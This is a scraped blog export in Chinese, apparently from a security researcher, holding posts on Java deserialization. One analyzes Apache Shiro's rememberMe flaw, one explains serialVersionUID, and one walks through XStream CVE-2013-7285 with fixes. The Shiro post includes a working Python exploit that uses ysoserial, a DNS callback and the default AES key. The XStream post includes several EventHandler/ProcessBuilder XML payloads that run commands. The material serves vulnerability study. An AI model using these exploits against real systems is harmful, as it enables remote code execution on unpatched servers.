读取cookie中的rememberMe字段的值 Base64解码 AES解密 Key已知 反序列化得到用户名 调试小记火狐+burpsuite 启动tomcat 第一次登陆注册，钩上rememberMe，之后正常登陆，抓包留存： 在解密这里下断点，在登录状态下发送第一步保存的数据包 触发断点，可以继续跟解密步骤了 利用这里结合URLDNS打一下： 12345678910111213141516171819202122target = \"http://127.0.0.1:8081/samples_web_war_exploded/\"jar_file = 'ysoserial-0.0.6-SNAPSHOT-all.jar'cipher_key = \"kPH+bIxk5D2deZiIxcaaaA==\"# 创建 rememberme的值popen = subprocess.Popen(['java','-jar', jar_file, \"URLDNS\", \"http://mfn1qr.dnslog.cn\"], stdout=subprocess.PIPE)BS = AES.block_sizepad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()mode = AES.MODE_CBCiv = uuid.uuid4().bytesencryptor = AES.new(base64.b64decode(cipher_key), mode, iv)file_body = pad(popen.stdout.read())base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))# 发送get请求try: r = requests.get(target, cookies=&#123;'rememberMe':base64_ciphertext.decode()&#125;, timeout=10)except: traceback.print_exc() Shiro-721用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段 影响版本：Apache Shiro &lt; 1.4.2版本 背景AES加密模式 AES是一种对称加密的分组加密算法。 每个分组长度固定为128bit 密钥长度可变，128bit、192bit、256bit AES应密钥长度可以称为AES-128，AES-192，AES-256 AES加密标准 密钥长度 分组长度 加密轮数 AES-128 128 bits ( 4 Bytes × 32 bits/Bytes ) 128 bits 10 AES-192 192 bits ( 6 Bytes × 32 bits/Bytes ) 128 bits 12 AES-256 256 bits ( 8 Bytes × 32 bits/Bytes ) 128 bits 14 分组模式分组加密有 5 种可选方式： ECS ( Electronic Codebook Book , 电话本模式 ) CBC ( Cipher Block Chaining , 密码分组链接模式 ) CTR ( Counter , 计算器模式 ) CFB ( Cipher FeedBack , 密码反馈模式 ) OFB ( Output FeedBack , 输出反馈模式 )","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"shiro","slug":"shiro","permalink":"https://0range228.github.io/tags/shiro/"}]},{"title":"serialVersionUID的那些事","slug":"serialVersionUID的那些事","date":"2021-07-28T05:50:42.000Z","updated":"2021-07-28T06:24:16.977Z","comments":true,"path":"serialVersionUID的那些事/","link":"","permalink":"https://0range228.github.io/serialVersionUID%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/","excerpt":"序言 老至居人下，春归在客先。 serialVersionUID，有点东西。","text":"序言 老至居人下，春归在客先。 serialVersionUID，有点东西。 概述在前两篇文章的基础上，我们知道了序列化就是把对象转化为字节流，反序列化就是将字节流还原为内存对象。 在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常，即是InvalidCastException。 总体来说：serialVersionUID的作用就是维护两端类文件的版本一致性。 serialVersionUID有两种显示的生成方式： 一是默认的1L，比如：private static final long serialVersionUID = 1L； 二是根据类名、接口名、成员方法及属性等来生成一个64位的哈希字段； 由来serialVersionUID如果我们没有显示赋值，那他是如何生成的呢？ 来到序列化流程中writeNonProxy方法中的getSerialVersionUID： 1234567891011121314public long getSerialVersionUID() &#123; // REMIND: synchronize instead of relying on volatile? if (suid == null) &#123; // 使用了一个内部类的方式，使用特权计算computeDefaultSUID(): suid = AccessController.doPrivileged( new PrivilegedAction&lt;Long&gt;() &#123; public Long run() &#123; return computeDefaultSUID(cl); &#125; &#125; ); &#125; return suid.longValue();&#125; 我们进入computeDefaultSUID方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139private static long computeDefaultSUID(Class&lt;?&gt; cl) &#123; // 代理 if (!Serializable.class.isAssignableFrom(cl) || Proxy.isProxyClass(cl)) &#123; return 0L; &#125; try &#123; ByteArrayOutputStream bout = new ByteArrayOutputStream(); DataOutputStream dout = new DataOutputStream(bout); // 类名 dout.writeUTF(cl.getName()); // 修饰符 int classMods = cl.getModifiers() &amp; (Modifier.PUBLIC | Modifier.FINAL | Modifier.INTERFACE | Modifier.ABSTRACT); // 方法 Method[] methods = cl.getDeclaredMethods(); if ((classMods &amp; Modifier.INTERFACE) != 0) &#123; classMods = (methods.length &gt; 0) ? (classMods | Modifier.ABSTRACT) : (classMods &amp; ~Modifier.ABSTRACT); &#125; dout.writeInt(classMods); if (!cl.isArray()) &#123; // 继承的接口 Class&lt;?&gt;[] interfaces = cl.getInterfaces(); String[] ifaceNames = new String[interfaces.length]; for (int i = 0; i &lt; interfaces.length; i++) &#123; ifaceNames[i] = interfaces[i].getName(); &#125; // 接口名 Arrays.sort(ifaceNames); for (int i = 0; i &lt; ifaceNames.length; i++) &#123; dout.writeUTF(ifaceNames[i]); &#125; &#125; // 全部属性 Field[] fields = cl.getDeclaredFields(); MemberSignature[] fieldSigs = new MemberSignature[fields.length]; for (int i = 0; i &lt; fields.length; i++) &#123; fieldSigs[i] = new MemberSignature(fields[i]); &#125; Arrays.sort(fieldSigs, new Comparator&lt;MemberSignature&gt;() &#123; public int compare(MemberSignature ms1, MemberSignature ms2) &#123; return ms1.name.compareTo(ms2.name); &#125; &#125;); for (int i = 0; i &lt; fieldSigs.length; i++) &#123; // 成员签名 MemberSignature sig = fieldSigs[i]; int mods = sig.member.getModifiers() &amp; (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED | Modifier.STATIC | Modifier.FINAL | Modifier.VOLATILE | Modifier.TRANSIENT); if (((mods &amp; Modifier.PRIVATE) == 0) || ((mods &amp; (Modifier.STATIC | Modifier.TRANSIENT)) == 0)) &#123; dout.writeUTF(sig.name); dout.writeInt(mods); dout.writeUTF(sig.signature); &#125; &#125; // 是否有静态初始化 if (hasStaticInitializer(cl)) &#123; dout.writeUTF(\"&lt;clinit&gt;\"); dout.writeInt(Modifier.STATIC); dout.writeUTF(\"()V\"); &#125; // 构造器 Constructor&lt;?&gt;[] cons = cl.getDeclaredConstructors(); MemberSignature[] consSigs = new MemberSignature[cons.length]; for (int i = 0; i &lt; cons.length; i++) &#123; consSigs[i] = new MemberSignature(cons[i]); &#125; Arrays.sort(consSigs, new Comparator&lt;MemberSignature&gt;() &#123; public int compare(MemberSignature ms1, MemberSignature ms2) &#123; return ms1.signature.compareTo(ms2.signature); &#125; &#125;); for (int i = 0; i &lt; consSigs.length; i++) &#123; MemberSignature sig = consSigs[i]; int mods = sig.member.getModifiers() &amp; (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED | Modifier.STATIC | Modifier.FINAL | Modifier.SYNCHRONIZED | Modifier.NATIVE | Modifier.ABSTRACT | Modifier.STRICT); if ((mods &amp; Modifier.PRIVATE) == 0) &#123; dout.writeUTF(\"&lt;init&gt;\"); dout.writeInt(mods); dout.writeUTF(sig.signature.replace('/', '.')); &#125; &#125; MemberSignature[] methSigs = new MemberSignature[methods.length]; for (int i = 0; i &lt; methods.length; i++) &#123; methSigs[i] = new MemberSignature(methods[i]); &#125; Arrays.sort(methSigs, new Comparator&lt;MemberSignature&gt;() &#123; public int compare(MemberSignature ms1, MemberSignature ms2) &#123; int comp = ms1.name.compareTo(ms2.name); if (comp == 0) &#123; comp = ms1.signature.compareTo(ms2.signature); &#125; return comp; &#125; &#125;); for (int i = 0; i &lt; methSigs.length; i++) &#123; MemberSignature sig = methSigs[i]; int mods = sig.member.getModifiers() &amp; (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED | Modifier.STATIC | Modifier.FINAL | Modifier.SYNCHRONIZED | Modifier.NATIVE | Modifier.ABSTRACT | Modifier.STRICT); if ((mods &amp; Modifier.PRIVATE) == 0) &#123; dout.writeUTF(sig.name); dout.writeInt(mods); dout.writeUTF(sig.signature.replace('/', '.')); &#125; &#125; dout.flush(); // 哈希操作，返回结果就是serialVersionUID MessageDigest md = MessageDigest.getInstance(\"SHA\"); byte[] hashBytes = md.digest(bout.toByteArray()); long hash = 0; for (int i = Math.min(hashBytes.length, 8) - 1; i &gt;= 0; i--) &#123; hash = (hash &lt;&lt; 8) | (hashBytes[i] &amp; 0xFF); &#125; return hash; &#125; catch (IOException ex) &#123; throw new InternalError(ex); &#125; catch (NoSuchAlgorithmException ex) &#123; throw new SecurityException(ex.getMessage()); &#125;&#125; 可以看到，serialVersionUID是由将类名，属性名，属性修饰符，继承的接口，属性类型，名称，方法，静态代码块等等这些都考虑进去了。 区别假设现在A、B双方准备进行序列化交互，A序列化，B反序列化，双方机器上都有Student类： 情景1：双方都利用系统默认生成的serialVersionUID。 如果这时候A决定为Student增加/缺少字段，此时B再反序列化会报错。 因为此时A、B两台机器上的Student类已经版本不一致了。 情景2：双方协商好使用统一的serialVersionUID。 这样如果A决定为Student增加/缺少字段，此时B再反序列化不会报错。 对于增加的字段。会根据类型赋给他初始值。 原因： 自动生成的，由于类文件变化，它也会跟着发生变化，会出现版本不一致的问题，导致反序列化失败。","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Java序列化原理","slug":"Java序列化原理","permalink":"https://0range228.github.io/tags/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"}]},{"title":"XStream反序列化漏洞梳理","slug":"XStream反序列化漏洞梳理","date":"2021-07-27T08:20:37.000Z","updated":"2021-08-27T09:07:13.864Z","comments":true,"path":"XStream反序列化漏洞梳理/","link":"","permalink":"https://0range228.github.io/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/","excerpt":"序言 百川东到海，何时复西归？ 这一篇来梳理XStream不同版本的花式RCE，也会是补全计划的一部分。","text":"序言 百川东到海，何时复西归？ 这一篇来梳理XStream不同版本的花式RCE，也会是补全计划的一部分。 老实本分的XStreamXStream格局可以的，直接把自己的List&lt; CVE &gt;放在了首页 会按照时间线逐个梳理。 基本API操作： 123456XStream xStream = new XStream();Person person = new Person(\"peter\",18);// object to xmlString xml = xStream.toXML(person);// xml to objectObject o = xStream.fromXML(xml); 重要组件XStream类图，参考XStream 源码解析： 主要分为四个部分： MarshallingStrategy编码策略： marshall : object-&gt;xml 编码 unmarshall : xml-&gt; object 解码 两个重要的类： TreeMarshaller: 树编组程序 调用Mapper和Converter把 java对象-&gt; XML 其中的start方法开始编组，convertAnother方法把java对象转化成XML。 TreeUnmarshaller ： 树解组程序 调用Mapper和Converter把 XML-&gt;java对象 里面的start方法开始解组，convertAnother方法把class转化成java对象。 Mapper映射器 通过mapper获取对象对应的类、成员、Field属性的Class对象，赋值给XML的标签字段。 ConverterXStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。 Converter的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为XML或将XML转换为对象。 简单地说，Xstream的思路是通过不同的converter来处理序列化数据中不同类型的数据。 Converter需要实现3个方法： canConvert方法：告诉XStream对象，它能够转换的对象； marshal方法：能够将对象转换为XML时候的具体操作； unmarshal方法：能够将XML转换为对象时的具体操作； http://x-stream.github.io/converters.html 这里告诉了我们针对各种对象XStream做了哪些支持。 XStream编组/解组具体过程XStream : 1.4.6 fromXMLxml-&gt;obj 先看如何反序列化出来的： 第一步：把String转化成StringReader，HierarchicalStreamDriver通过StringReader创建HierarchicalStreamReader，最后调用MarshallingStrategy的unmarshal方法开始解组 第二步：进入start方法，开始解析： 123456789101112131415public Object start(DataHolder dataHolder) &#123; this.dataHolder = dataHolder; //通过Mapper获取对应节点的Class对象 Class type = HierarchicalStreams.readClassType(this.reader, this.mapper); //Converter根据Class的类型转化成java对象 Object result = this.convertAnother((Object)null, type); Iterator validations = this.validationList.iterator(); while(validations.hasNext()) &#123; Runnable runnable = (Runnable)validations.next(); runnable.run(); &#125; return result;&#125; 先看readClassType里面做了什么事情： 123456789101112public static Class readClassType(HierarchicalStreamReader reader, Mapper mapper) &#123; String classAttribute = readClassAttribute(reader, mapper); Class type; if (classAttribute == null) &#123; // 通过节点名获取Mapper中对应的Class对象 type = mapper.realClass(reader.getNodeName()); &#125; else &#123; type = mapper.realClass(classAttribute); &#125; //返回值type就是obj对应的Class对象 return type;&#125; 第三步 ： convertAnother 方法 123456789101112131415public Object convertAnother(Object parent, Class type, Converter converter) &#123; //根据mapper获取type类对象的正确类型 type = this.mapper.defaultImplementationOf(type); if (converter == null) &#123; //根据type找到对应的converter converter = this.converterLookup.lookupConverterForType(type); &#125; else if (!converter.canConvert(type)) &#123; ConversionException e = new ConversionException(\"Explicit selected converter cannot handle type\"); e.add(\"item-type\", type.getName()); e.add(\"converter-type\", converter.getClass().getName()); throw e; &#125; return this.convert(parent, type, converter);&#125; 注意这里参数parent，converter默认都是null 如何查找对应的converter？ 12345678910111213141516171819202122public Converter lookupConverterForType(Class type) &#123; //先从缓存集合中查找Converter Converter cachedConverter = (Converter)this.typeToConverterMap.get(type); if (cachedConverter != null) &#123; return cachedConverter; &#125; else &#123;// 如果缓存中没有，那么就在converter中寻找 Iterator iterator = this.converters.iterator(); Converter converter; // 遍历converters找到符合的Converter do &#123; if (!iterator.hasNext()) &#123; throw new ConversionException(\"No converter specified for \" + type); &#125; converter = (Converter)iterator.next(); &#125; while(!converter.canConvert(type)); // 把这次找到的放在缓存集合中 this.typeToConverterMap.put(type, converter); return converter; &#125;&#125; 现在来到return this.convert(parent, type, converter);这句 会到com.thoughtworks.xstream.core.TreeUnmarshaller#convert这里： 12345678910111213141516protected Object convert(Object parent, Class type, Converter converter) &#123; try &#123; this.types.push(type); // 会进入这里 Object result = converter.unmarshal(this.reader, this); this.types.popSilently(); return result; &#125; catch (ConversionException var6) &#123; this.addInformationTo(var6, type, converter, parent); throw var6; &#125; catch (RuntimeException var7) &#123; ConversionException conversionException = new ConversionException(var7); this.addInformationTo(conversionException, type, converter, parent); throw conversionException; &#125;&#125; 1234567public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) &#123; // 构造Class类对象的instance实例，field没有赋值，都是默认值 Object result = this.instantiateNewInstance(reader, context); // 对result的field赋值 result = this.doUnmarshal(result, reader, context); return this.serializationMethodInvoker.callReadResolve(result);&#125; 有趣的ConverterXstream在处理实现了Serializable接口和没有实现Serializable接口的类生成的对象时，方法是不一样的。 Xstream的思路是在反序列化时，通过不同的converter来处理不同类型的数据。 最外层的没有实现Serializable接口的类时用的是ReflectionConverter，该Converter的原理是通过反射获取类对象并通过反射为其每个属性进行赋值。 如果是处理实现了Serializable接口并且重写了readObject方法的对象时使用的是SerializableConverter，并且readObject方法也会被调用。 CVE-2013-7285影响范围： XStream version &lt;= 1.4.6 &amp; XStream version = 1.4.10 漏洞成因动态代理经典老番动态代理那些事 EventHandlerEventHandler也是实现了InvocationHandler接口的类 EventHandler用来监控接口中的方法被调用后执行EventHandler中成员变量指定的方法。 注意两个属性：target , action 看个小例子： 123456789101112131415161718192021222324interface HelloService &#123; void goodMorning(); void goodEvening();&#125;class HelloImpl implements HelloService &#123; @Override public void goodMorning() &#123; System.out.println(\"Good Morning!\"); &#125; @Override public void goodEvening() &#123; System.out.println(\"Good Evening!\"); &#125;&#125;public class Tester &#123; public static void main(String[] args) &#123; HelloService hello = new HelloImpl(); EventHandler start = new EventHandler(new ProcessBuilder(\"open\",\"/Applications/Calculator.app\"), \"start\", null, null); HelloService o = (HelloService)Proxy.newProxyInstance(hello.getClass().getClassLoader(), hello.getClass().getInterfaces(), start); o.goodMorning(); &#125;&#125; 经典老番，计算器弹出： 跟一下是怎么走的： EventHandler.invoke()： EventHandler.invokeInternal()： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263private Object invokeInternal(Object proxy, Method method, Object[] arguments) &#123; String methodName = method.getName(); if (method.getDeclaringClass() == Object.class) &#123; // Handle the Object public methods. // 这里首先查看被调用的方法是不是hashCode、equals、toString if (methodName.equals(\"hashCode\")) &#123; return new Integer(System.identityHashCode(proxy)); &#125; else if (methodName.equals(\"equals\")) &#123; return (proxy == arguments[0] ? Boolean.TRUE : Boolean.FALSE); &#125; else if (methodName.equals(\"toString\")) &#123; return proxy.getClass().getName() + '@' + Integer.toHexString(proxy.hashCode()); &#125; &#125; if (listenerMethodName == null || listenerMethodName.equals(methodName)) &#123; Class[] argTypes = null; Object[] newArgs = null; if (eventPropertyName == null) &#123; // Nullary method. newArgs = new Object[]&#123;&#125;; argTypes = new Class&lt;?&gt;[]&#123;&#125;; &#125; else &#123; Object input = applyGetters(arguments[0], getEventPropertyName()); newArgs = new Object[]&#123;input&#125;; argTypes = new Class&lt;?&gt;[]&#123;input == null ? null : input.getClass()&#125;; &#125; try &#123; int lastDot = action.lastIndexOf('.'); if (lastDot != -1) &#123; target = applyGetters(target, action.substring(0, lastDot)); action = action.substring(lastDot + 1); &#125; Method targetMethod = Statement.getMethod( target.getClass(), action, argTypes); if (targetMethod == null) &#123; targetMethod = Statement.getMethod(target.getClass(), \"set\" + NameGenerator.capitalize(action), argTypes); &#125; if (targetMethod == null) &#123; String argTypeString = (argTypes.length == 0) ? \" with no arguments\" : \" with argument \" + argTypes[0]; throw new RuntimeException( \"No method called \" + action + \" on \" + target.getClass() + argTypeString); &#125; // 在这里通过反射调用方法 return MethodUtil.invoke(targetMethod, target, newArgs); &#125; catch (IllegalAccessException ex) &#123; throw new RuntimeException(ex); &#125; catch (InvocationTargetException ex) &#123; Throwable th = ex.getTargetException(); throw (th instanceof RuntimeException) ? (RuntimeException) th : new RuntimeException(th); &#125; &#125; return null;&#125; MethodUtil.invoke(targetMethod, target, newArgs)形成了方法调用： 在这个例子里面： targetMethod：ProcessBuilder.start()方法 （action参数） target：构造好带有恶意命令的ProcessBuilder对象 在这里被invoke触发了 targetMethod哪里来的？就是一开始的action参数 1Method targetMethod = Statement.getMethod(target.getClass(), action, argTypes); 看看Converter里面如何解析动态代理对象 DynamicProxyConverter 如图，xml对应的标签就是&lt;dynamic-proxy&gt;，这其中： &lt;interface&gt;标签就是被代理的接口 &lt;handler&gt;标签表示InvocationHandler实例 按照官网的这个例子： dynamic-proxy标签在XStream反序列化之后会得到一个动态代理类对象，当访问了该对象的com.foo.Blah或com.foo.Woo这两个接口类中声明的方法时（即interface标签内指定的接口类），就会调用handler标签中的类方法com.foo.MyHandler。 PoC基于接口这种也是官网钦定的PoC，interfece字段随便选择一个public接口就行： 123456789101112&lt;dynamic-proxy&gt; &lt;interface&gt;com.thoughtworks.xstream.io.HierarchicalStreamReader&lt;/interface&gt; &lt;handler class=\"java.beans.EventHandler\"&gt; &lt;target class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;open&lt;/string&gt; &lt;string&gt;/Applications/Calculator.app&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt;&lt;/dynamic-proxy&gt; 复现： 123456789public class Interface_Exploit &#123; public static void main(String[] args) throws FileNotFoundException &#123; FileInputStream payload = XStreamUtils.getPayload(\"CVE_2013_7285_Interface\"); XStream xStream = new XStream(); HierarchicalStreamReader obj = (HierarchicalStreamReader)xStream.fromXML(payload); obj.hasMoreChildren(); &#125;&#125; 这里我为了省事，选的是com.thoughtworks.xstream.io.HierarchicalStreamReader接口+它内部的hasMoreChildren无参方法。 调试就是上面EventHandler那部分，这种方式结合了动态代理。 基于SortedSet123456789101112131415&lt;sorted-set&gt; &lt;string&gt;test&lt;/string&gt; &lt;dynamic-proxy&gt; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt; &lt;handler class=\"java.beans.EventHandler\"&gt; &lt;target class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;open&lt;/string&gt; &lt;string&gt;/Applications/Calculator.app&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt; &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt; 复现： 1234567public class SortedSet_Exploit &#123; public static void main(String[] args) throws FileNotFoundException &#123; FileInputStream payload = XStreamUtils.getPayload(\"CVE_2013_7285_SortedSet\"); XStream xStream = new XStream(); xStream.fromXML(payload); &#125;&#125; 调试： fromXML跟进去，到com.thoughtworks.xstream.core.TreeUnmarshaller#start，这里代表开始解析xml还原obj： 123456789101112131415public Object start(DataHolder dataHolder) &#123; this.dataHolder = dataHolder; // 通过mapper获取对应节点的Class对象 Class type = HierarchicalStreams.readClassType(this.reader, this.mapper); //Converter根据Class的类型转化成java对象 Object result = this.convertAnother((Object)null, type); Iterator validations = this.validationList.iterator(); while(validations.hasNext()) &#123; Runnable runnable = (Runnable)validations.next(); runnable.run(); &#125; return result;&#125; 这里我们先进readClassType： 123456789101112public static Class readClassType(HierarchicalStreamReader reader, Mapper mapper) &#123; String classAttribute = readClassAttribute(reader, mapper); Class type; if (classAttribute == null) &#123; // 通过节点名获取Mapper中对应的Class对象 type = mapper.realClass(reader.getNodeName()); &#125; else &#123; type = mapper.realClass(classAttribute); &#125; return type;&#125; 先进入readClassAttribute方法： 123456789101112public static String readClassAttribute(HierarchicalStreamReader reader, Mapper mapper) &#123; // 尝试在xml里获取resolves-to和class标签 String attributeName = mapper.aliasForSystemAttribute(\"resolves-to\"); String classAttribute = attributeName == null ? null : reader.getAttribute(attributeName); if (classAttribute == null) &#123; attributeName = mapper.aliasForSystemAttribute(\"class\"); if (attributeName != null) &#123; classAttribute = reader.getAttribute(attributeName); &#125; &#125; return classAttribute;&#125; 这里返回为空，继续来看到com.thoughtworks.xstream.core.util.HierarchicalStreams#readClass方法 获取当前节点的名称，并进行返回对应的class对象。 1234567891011121314151617181920public Class realClass(String elementName) &#123; Object cached = this.realClassCache.get(elementName); if (cached != null) &#123; if (cached instanceof Class) &#123; return (Class)cached; &#125; else &#123; throw (CannotResolveClassException)cached; &#125; &#125; else &#123; try &#123; Class result = super.realClass(elementName); //找到别名应的类，存储到realClassCache中，并且进行返回。 this.realClassCache.put(elementName, result); return result; &#125; catch (CannotResolveClassException var4) &#123; this.realClassCache.put(elementName, var4); throw var4; &#125; &#125;&#125; 回到start方法中：该执行Object result = this.convertAnother((Object)null, type);这里： 进入this.convertAnother方法： 123456789101112131415public Object convertAnother(Object parent, Class type, Converter converter) &#123; //根据mapper获取type实现类 type = this.mapper.defaultImplementationOf(type); if (converter == null) &#123; //根据type找到对应的converter converter = this.converterLookup.lookupConverterForType(type); &#125; else if (!converter.canConvert(type)) &#123; ConversionException e = new ConversionException(\"Explicit selected converter cannot handle type\"); e.add(\"item-type\", type.getName()); e.add(\"converter-type\", converter.getClass().getName()); throw e; &#125; //把type转化成对应的object return this.convert(parent, type, converter);&#125; 先看defaultImplementationOf方法： 看到他返回的是java.util.TreeSet的类对象，也就是type的结果 接下来根据type找到对应的converter，也就进入lookupConverterForType方法： 1234567891011121314151617181920212223public Converter lookupConverterForType(Class type) &#123; //先查询缓存的类型对应的转换器集合 Converter cachedConverter = (Converter)this.typeToConverterMap.get(type); if (cachedConverter != null) &#123; //如果在缓存中找得到，就返回找到的缓存转换器 return cachedConverter; &#125; else &#123; Iterator iterator = this.converters.iterator(); Converter converter; // 开始遍历，知道找到可以转换TreeSet类型的Converter do &#123; if (!iterator.hasNext()) &#123; throw new ConversionException(\"No converter specified for \" + type); &#125; converter = (Converter)iterator.next(); &#125; while(!converter.canConvert(type)); // 找到之后就放在缓存中 this.typeToConverterMap.put(type, converter); // 将匹配的converter返回 return converter; &#125;&#125; 进入convert方法： 123456789101112131415161718192021222324252627282930313233343536protected Object convert(Object parent, Class type, Converter converter) &#123; Object result; if (this.parentStack.size() &gt; 0) &#123; result = this.parentStack.peek(); if (result != null &amp;&amp; !this.values.containsKey(result)) &#123; this.values.put(result, parent); &#125; &#125; //获取reference标签的内容 String attributeName = this.getMapper().aliasForSystemAttribute(\"reference\"); String reference = attributeName == null ? null : this.reader.getAttribute(attributeName); Object cache; if (reference != null) &#123; cache = this.values.get(this.getReferenceKey(reference)); if (cache == null) &#123; ConversionException ex = new ConversionException(\"Invalid reference\"); ex.add(\"reference\", reference); throw ex; &#125; result = cache == NULL ? null : cache; &#125; else &#123; //如果reference字段内容为空就到这里，获取当前标签 cache = this.getCurrentReferenceKey(); this.parentStack.push(cache); result = super.convert(parent, type, converter); if (cache != null) &#123; this.values.put(cache, result == null ? NULL : result); &#125; this.parentStack.popSilently(); &#125; return result;&#125; 来到这里： 1Object result = converter.unmarshal(this.reader, this); 通过匹配获取到的converter，调用unmarshal方法，进行xml解析： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) &#123; TreeSet result = null; //判断是否存在comparator，如果不存在，则返回NullComparator对象。 Comparator unmarshalledComparator = this.treeMapConverter.unmarshalComparator(reader, context, (TreeMap)null); boolean inFirstElement = unmarshalledComparator instanceof Null; Comparator comparator = inFirstElement ? null : unmarshalledComparator; TreeMap treeMap; if (sortedMapField != null) &#123; // possibleResult也是创建的是一个空的TreeSet对象。而后则是一些赋值，就没必要一一去看了。 TreeSet possibleResult = comparator == null ? new TreeSet() : new TreeSet(comparator); Object backingMap = null; try &#123; backingMap = sortedMapField.get(possibleResult); &#125; catch (IllegalAccessException var11) &#123; throw new ConversionException(\"Cannot get backing map of TreeSet\", var11); &#125; if (backingMap instanceof TreeMap) &#123; treeMap = (TreeMap)backingMap; result = possibleResult; &#125; else &#123; treeMap = null; &#125; &#125; else &#123; treeMap = null; &#125; if (treeMap == null) &#123; PresortedSet set = new PresortedSet(comparator); result = comparator == null ? new TreeSet() : new TreeSet(comparator); if (inFirstElement) &#123; this.addCurrentElementToCollection(reader, context, result, set); reader.moveUp(); &#125; this.populateCollection(reader, context, result, set); if (set.size() &gt; 0) &#123; result.addAll(set); &#125; &#125; else &#123; //重点部分来了！！！ this.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator); &#125; return result;&#125; 1this.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator); 跟进看： 进入90行的putCurrentEntryIntoMap： 方法内的target参数就是sortedMap，可以看到这里读取标签内的内容并缓存到target这个Map中。 返回上一级方法： 继续往下，来到populateMap方法 123456789101112131415protected void populateMap(HierarchicalStreamReader reader, UnmarshallingContext context, Map map, final Map target) &#123; TreeSetConverter.this.populateCollection(reader, context, new AbstractList() &#123; public boolean add(Object object) &#123; return target.put(object, object) != null; &#125; public Object get(int location) &#123; return null; &#125; public int size() &#123; return target.size(); &#125; &#125;);&#125; 解读：这里就是调用populateCollection用来循环遍历子标签中的元素并添加到集合中。 继续跟，来到这里： 进入addCurrentElementToCollection方法： 再进入readItem方法： 这里readItem做的事情和前面的一样： 依然还是继续读取标签内容，并且获取转换成对应的类，最后将类添加到target中。 由于我们的payload是一个动态代理类，会来到com.thoughtworks.xstream.converters.extended.DynamicProxyConverter#unmarshal这里： 这里的hander就是我们传入的EventHandler，相当于被包装成了动态代理类proxy，proxy返回。 一路返回，在com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap这里proxy被触发： 总结几个关键步骤： TreeUnmarshaller#start开始解析xml HierarchicalStreams#readClassType通过标签获取Mapper中对应的Class对象 TreeUnmarshaller#convertAnother将Class对象转换为对应的Java对象 mapper.defaultImplementationOf()查找Class类的实现类，根据实现类获取对应的converter convert方法返回object对象 调用对应converter的unmarshall方法继续解析子节点 如何触发的？ string标签会被识别出StringConverter转换器来解析出string标签内的字符串test； dynamic-proxy标签会被识别出对应的DynamicProxyConverter转换器来解析出动态代理类对象； 由于TreeMap.putAll()被调用，那么TreeSetConverter会对比两个子元素即调用$Proxy0.compareTo()来比较，而dynamic-proxy标签内实现了Comparable接口，因此由动态代理机制会触发dynamic-proxy标签内的handler标签指向的EventHandler类方法，从而利用反射机制实现任意代码执行。 基于TreeMap123456789101112131415161718192021&lt;tree-map&gt; &lt;entry&gt; &lt;string&gt;fookey&lt;/string&gt; &lt;string&gt;foovalue&lt;/string&gt; &lt;/entry&gt; &lt;entry&gt; &lt;dynamic-proxy&gt; &lt;interface&gt;java.lang.Comparable&lt;/interface&gt; &lt;handler class=\"java.beans.EventHandler\"&gt; &lt;target class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;open&lt;/string&gt; &lt;string&gt;/Applications/Calculator.app&lt;/string&gt; &lt;/command&gt; &lt;/target&gt; &lt;action&gt;start&lt;/action&gt; &lt;/handler&gt; &lt;/dynamic-proxy&gt; &lt;string&gt;good&lt;/string&gt; &lt;/entry&gt;&lt;/tree-map&gt; 复现： 调试：先说结论，还是在putAll处触发 只不过这次的涉及到的转换器是TreeMapConverter，整个过程先在treemap里面放一个entry，string作为key值向里面添加。引发compareTo，handler被调用，漏洞触发。 修复若版本号&gt;=1.4.7，XStream提供了一个安全框架供用户使用，但必须手工设置，建立黑白名单机制进行过滤： 1234567891011121314XStream.addPermission(TypePermission);XStream.allowTypes(Class[]);XStream.allowTypes(String[]);XStream.allowTypesByRegExp(String[]);XStream.allowTypesByRegExp(Pattern[]);XStream.allowTypesByWildcard(String[]);XStream.allowTypeHierary(Class);XStream.denyPermission(TypePermission);XStream.denyTypes(Class[]);XStream.denyTypes(String[]);XStream.denyTypesByRegExp(String[]);XStream.denyTypesByRegExp(Pattern[]);XStream.denyTypesByWildcard(String[]);XStream.denyTypeHierary(Class); 在1.4.10版本之后，XStream提供了XStream.setupDefaultSecurity()函数来设置XStream反序列化类型的默认白名单，部分白名单是Xstream默认的，用户可以直接调用。 CVE-2020-26217XStream：1.4.13 